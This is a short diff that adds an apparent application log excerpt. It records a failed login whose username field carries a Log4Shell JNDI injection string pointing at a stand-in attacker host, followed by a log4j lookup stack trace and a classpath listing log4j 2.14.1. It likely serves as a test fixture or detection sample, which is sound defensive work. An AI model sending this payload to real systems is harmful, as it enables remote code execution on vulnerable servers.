@@ -1,0 +1,5 @@
+2021-12-10 14:32:07,118 WARN [http-nio-8080-exec-3] c.e.app.LoginController -
+  Failed login for user: ${jndi:ldap://attacker.example:1389/a}
+  at org.apache.logging.log4j.core.lookup.JndiLookup.lookup(JndiLookup.java)
+  at org.apache.logging.log4j.core.lookup.Interpolator.lookup(Interpolator.java)
+Classpath: /opt/app/lib/log4j-core-2.14.1.jar:/opt/app/lib/log4j-api-2.14.1.jar
